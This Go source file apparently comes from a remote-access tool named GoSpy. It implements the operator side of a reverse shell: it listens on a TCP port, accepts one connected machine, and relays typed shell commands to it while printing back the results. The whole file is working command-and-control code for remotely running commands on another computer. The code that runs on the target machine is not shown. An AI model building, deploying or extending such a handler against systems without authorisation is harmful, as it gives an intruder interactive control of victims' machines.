package client

import (
	"bufio"
	"fmt"
	"github.com/psidex/GoSpy/internal/comms"
	"net"
	"os"
	"strings"
)

// GoSpyClient represents a GoSpy client that is connected to this server.
type GoSpyClient struct {
	conn net.Conn
}

// GetGoSpyClient starts a tcp server and waits for a single connection, returning a GoSpyClient that instantiated connection.
func GetGoSpyClient(address string) (client GoSpyClient, err error) {
	l, err := net.Listen("tcp", address)
	if err != nil {
		return GoSpyClient{}, err
	}

	defer l.Close() // Closing the server won't close the already established client connection.

	conn, err := l.Accept()
	if err != nil {
		return GoSpyClient{}, err
	}

	return GoSpyClient{conn}, nil
}

// sendString sends a string to the client.
func (c GoSpyClient) sendString(message string) (err error) {
	return comms.SendStringTo(c.conn, message)
}

// recvString receives a string from the client.
func (c GoSpyClient) recvString() (message string, err error) {
	return comms.RecvStringFrom(c.conn)
}

// Ping sends a "ping" to the client and waits for a "pong".
func (c GoSpyClient) Ping() (response string, err error) {
	err = c.sendString("ping")
	if err != nil {
		return "", err
	}
	return c.recvString()
}

// EnterReverseShellRepl initiates a REPL with the client.
func (c GoSpyClient) EnterReverseShellRepl() (err error) {
	err = c.sendString("reverse-shell")
	if err != nil {
		return err
	}

	for {
		fmt.Print("\n$ ")

		reader := bufio.NewReader(os.Stdin)
		text, _ := reader.ReadString('\n')
		text = strings.TrimSpace(text)

		err := c.sendString(text)
		if err != nil {
			fmt.Printf("Got error: %e\n", err)
		}

		// Exit after sending exit to client.
		if text == "exit" {
			return nil
		}

		resp, err := c.recvString()
		if err != nil {
			fmt.Printf("Got error: %e\n", err)
		}

		fmt.Println(resp)
	}
}
